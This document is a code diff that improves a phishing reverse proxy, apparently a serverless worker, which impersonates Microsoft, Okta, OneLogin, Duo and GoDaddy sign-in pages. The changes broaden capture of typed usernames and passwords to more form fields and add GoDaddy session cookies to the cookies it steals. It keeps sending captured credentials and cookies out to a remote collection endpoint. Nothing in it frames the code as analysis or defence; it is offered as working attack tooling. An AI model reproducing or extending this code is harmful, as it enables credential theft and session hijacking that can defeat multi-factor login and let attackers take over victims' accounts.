@@ -36,7 +36,7 @@ const CRITICAL_AUTH_COOKIES = {
   okta: ['sid', 'authtoken'],
   onelogin: ['sub_session_onelogin'],
   duo: ['.*'],
-  godaddy: ['akm_lmprb-ssn', 'auth_id']
+  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token']
 };
 // =======================================================================
 
@@ -141,11 +141,13 @@ function rewriteUrls(text, upstreamDomain) {
     );
   });
   
+  // Fix relative paths
   result = result.replace(
     /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
     `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
   );
   
+  // Fix JS references
   result = result.replace(
     /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
     `window.location.hostname = "${YOUR_DOMAIN}"`
@@ -185,7 +187,7 @@ function hasCriticalAuthCookies(cookieString, platform) {
   });
 }
 
-// ==================== EXACT CREDENTIAL LOGIC FROM WORKING SCRIPT ====================
+// ==================== UNIVERSAL CREDENTIAL PARSING ====================
 function parseCredentials(bodyText) {
   const keyValuePairs = bodyText.split('&');
   let user = null;
@@ -193,11 +195,24 @@ function parseCredentials(bodyText) {
   
   for (const pair of keyValuePairs) {
     const [key, value] = pair.split('=');
-    if (key === 'login' && value) {
-      user = decodeURIComponent(value.replace(/\+/g, ' '));
+    if (!value) continue;
+    
+    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));
+    
+    // Microsoft fields
+    if (key === 'login' || key === 'loginfmt') {
+      user = decodedValue;
     }
-    if (key === 'passwd' && value) {
-      pass = decodeURIComponent(value.replace(/\+/g, ' '));
+    if (key === 'passwd') {
+      pass = decodedValue;
+    }
+    
+    // GoDaddy fields (and generic fields)
+    if (key === 'username' || key === 'email' || key === 'user') {
+      user = decodedValue;
+    }
+    if (key === 'password' || key === 'pwd' || key === 'pass') {
+      pass = decodedValue;
     }
   }
   
@@ -227,21 +242,21 @@ export default async function handleRequest(request) {
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
 
-  // ==================== EXACT CREDENTIAL CAPTURE FROM WORKING SCRIPT ====================
+  // ==================== CREDENTIAL CAPTURE ====================
   if (request.method === 'POST') {
     try {
-      // Clone request and get body text exactly like working script
+      // Clone request and get body text
       const temp_req = await request.clone();
       const bodyText = await temp_req.text();
       
-      console.log('[DEBUG] POST body:', bodyText.substring(0, 200));
+      console.log('[DEBUG] POST body:', bodyText.substring(0, 300));
       
-      // Use EXACT parsing logic from working script
+      // Use universal parsing logic
       const { user, pass } = parseCredentials(bodyText);
       
-      // If both present, send immediately (single POST contains both)
+      // If both present, send immediately
       if (user && pass) {
-        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Pass: ****`);
+        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Pass: **** Platform: ${info.type}`);
         
         // Send to API as JSON
         await sendToVercel('credentials', {
@@ -287,17 +302,21 @@ export default async function handleRequest(request) {
     
     const resp = await fetch(upstreamUrl, fetchOpts);
     
+    // Handle redirect
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
         const newHeaders = new Headers(resp.headers);
         const newLoc = rewriteLocation(loc);
+        
         console.log(`[Redirect] ${loc} -> ${newLoc}`);
+        
         newHeaders.set('Location', newLoc);
         return new Response(null, { status: resp.status, headers: newHeaders });
       }
     }
     
+    // Process response
     const newHeaders = new Headers(resp.headers);
     newHeaders.set('access-control-allow-origin', '*');
     newHeaders.set('access-control-allow-credentials', 'true');
@@ -325,6 +344,7 @@ export default async function handleRequest(request) {
       await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
     }
     
+    // Rewrite body content
     const ct = resp.headers.get('content-type') || '';
     if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
       let text = await resp.text();
